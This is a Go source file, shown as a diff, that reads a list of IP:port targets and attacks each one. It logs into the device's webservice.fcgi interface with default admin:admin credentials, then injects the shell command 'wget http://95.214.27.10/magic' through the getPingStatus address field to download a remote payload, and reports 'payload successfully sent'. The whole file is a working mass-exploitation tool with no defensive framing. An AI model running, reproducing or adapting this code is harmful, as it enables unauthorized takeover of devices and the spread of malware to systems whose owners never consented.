@@ -1,0 +1,133 @@
+package main
+
+import (
+    "bufio"
+    "bytes"
+    "fmt"
+    "net/http"
+    "os"
+    "strings"
+)
+
+func main() {
+    // Open the "ips.txt" file for reading
+    file, err := os.Open("ips.txt")
+    if err != nil {
+        fmt.Println("Error opening ips.txt:", err)
+        return
+    }
+    defer file.Close()
+
+    scanner := bufio.NewScanner(file)
+
+    for scanner.Scan() {
+        // Read each line from the file, which should contain IP:Port
+        ipPort := strings.TrimSpace(scanner.Text())
+
+        url := "http://" + ipPort + "/cgi-bin/webservice.fcgi?so/login"
+
+        // Define the JSON payload
+        payload := []byte(`[{"name":"username","value":"admin"},{"name":"password","value":"admin"}]`)
+
+        // Calculate Content-Length
+        contentLength := len(payload)
+
+        // Create a new HTTP request
+        req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
+        if err != nil {
+        //  fmt.Println("Error creating request:", err)
+            return
+        }
+
+        // Set request headers
+        req.Header.Set("Host", ipPort)
+        req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
+        req.Header.Set("X-Requested-With", "XMLHttpRequest")
+        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36")
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("Origin", "http://"+ipPort)
+        req.Header.Set("Referer", "http://"+ipPort+"/login.html")
+        req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+        req.Header.Set("Content-Length", fmt.Sprintf("%d", contentLength))
+        req.Close = true
+
+        // Send the HTTP request
+        client := &http.Client{}
+        resp, err := client.Do(req)
+        if err != nil {
+    //      fmt.Println("Error sending request:", err)
+            return
+        }
+        defer resp.Body.Close()
+
+        // Check if the response body matches the specified criteria
+        if resp.StatusCode == http.StatusOK {
+            // Modify the response body
+            modifiedResponse := []byte(`{"status":0,"info":"success"}`)
+
+            // Create a new request with the modified response
+            req, err := http.NewRequest("POST", url, bytes.NewBuffer(modifiedResponse))
+            if err != nil {
+            //  fmt.Println("Error creating modified request:", err)
+                return
+            }
+
+            // Set the second set of headers
+            req.Header.Set("Content-Type", "application/json")
+            req.Header.Set("Connection", "close")
+            req.Header.Set("Content-Length", fmt.Sprintf("%d", len(modifiedResponse)))
+            req.Header.Set("Date", "Wed, 20 Sep 2023 13:36:48 GMT")
+            req.Header.Set("Server", "lighttpd/1.4.58")
+
+            // Send the modified request
+            _, err = client.Do(req)
+            if err != nil {
+            //  fmt.Println("Error sending modified request:", err)
+                return
+            }
+
+            // Now send the additional request with the specified headers and payload
+            additionalURL := "http://" + ipPort + "/cgi-bin/webservice.fcgi?so/getPingStatus"
+            additionalPayload := []byte(`[{"name":"address","value":"-c;wget http://95.214.27.10/magic;"}]`)
+            additionalContentLength := len(additionalPayload)
+
+            // Create a new HTTP request for the additional request
+            additionalReq, err := http.NewRequest("POST", additionalURL, bytes.NewBuffer(additionalPayload))
+            if err != nil {
+            //  fmt.Println("Error creating additional request:", err)
+                return
+            }
+
+            // Set request headers for the additional request
+            additionalReq.Header.Set("Host", ipPort)
+            additionalReq.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
+            additionalReq.Header.Set("X-Requested-With", "XMLHttpRequest")
+            additionalReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36")
+            additionalReq.Header.Set("Content-Type", "application/json")
+            additionalReq.Header.Set("Origin", "http://"+ipPort)
+            additionalReq.Header.Set("Referer", "http://"+ipPort+"/diagnose.html")
+            additionalReq.Header.Set("Accept-Encoding", "gzip, deflate, br")
+            additionalReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
+            additionalReq.Header.Set("Content-Length", fmt.Sprintf("%d", additionalContentLength))
+            additionalReq.Close = true
+
+            // Send the additional HTTP request
+            _, err = client.Do(additionalReq)
+            if err != nil {
+                fmt.Println("Error sending additional request:", err)
+                return
+            }
+
+            // Print a success message once the additional request is sent
+            fmt.Println("[USR] payload successfully sent to", ipPort)
+        }
+
+        // You can add a break condition here if needed.
+        // For example, if you want to exit the loop after a certain number of iterations.
+    }
+
+    if err := scanner.Err(); err != nil {
+        fmt.Println("Error reading ips.txt:", err)
+    }
+}
